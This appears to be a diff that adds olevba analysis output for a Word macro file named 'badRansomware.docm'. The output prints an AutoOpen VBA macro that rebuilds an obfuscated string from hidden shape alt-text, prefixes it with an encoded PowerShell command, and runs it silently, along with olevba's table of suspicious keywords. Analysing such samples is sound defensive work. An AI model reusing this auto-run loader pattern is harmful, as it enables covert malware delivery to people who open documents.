@@ -1,0 +1,59 @@
+olevba 0.60 on Python 2.7.16 - http://decalage.info/python/oletools
+===============================================================================
+FILE: badRansomware.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Private Declare Sub Sleep Lib "kernel32" form(ByVal dwMilliseconds As Long)
+
+Sub AutoOpen()
+
+  Dim p_string
+  p_string = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
+  p_string = ActiveDocument.Shapes("adaopiwer").AlternativeText & p_string
+
+  Dim three_at_signs
+  three_at_signs = "@@@"
+  p_string = Split(p_string, three_at_signs)
+
+  Dim start
+  start = 0
+
+  Dim stop
+  stop = UBound(p_string) - 1
+
+  Dim final_string
+
+  For E = start To stop
+    Dim ascii_code
+    Dim letter
+
+    ascii_code = p_string(E)
+    letter = ChrW(ascii_code)
+    final_string = final_string & letter
+  Next
+
+  final_string = "powershell -e IAB" & final_string
+
+  Call Shell(final_string, 0)
+
+End Sub
+
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Lib                 |May run code from a DLL                      |
+|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
++----------+--------------------+---------------------------------------------+
